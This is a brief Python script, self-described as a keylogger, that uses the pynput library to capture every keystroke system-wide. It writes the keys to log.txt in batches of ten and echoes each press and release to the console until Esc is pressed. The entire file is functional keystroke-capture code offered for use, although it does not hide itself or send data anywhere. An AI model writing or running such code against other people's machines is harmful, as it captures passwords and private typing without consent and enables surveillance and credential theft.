#Keylooger using pynput library
#Author: Roberto Perez
#Date: Feb 26 2019
import pynput

from pynput import keyboard

count = 0
keys =[]

def write_file(self):
	with open("log.txt","a") as f:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") > 0:
				f.write(' ')
			elif k.find("Key") == -1:
				f.write(k)

def on_press(key):
    global keys,count
    keys.append(key)
    count += 1

    if count >= 10:
    	count  = 0
    	write_file(keys)
    	keys = []


    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()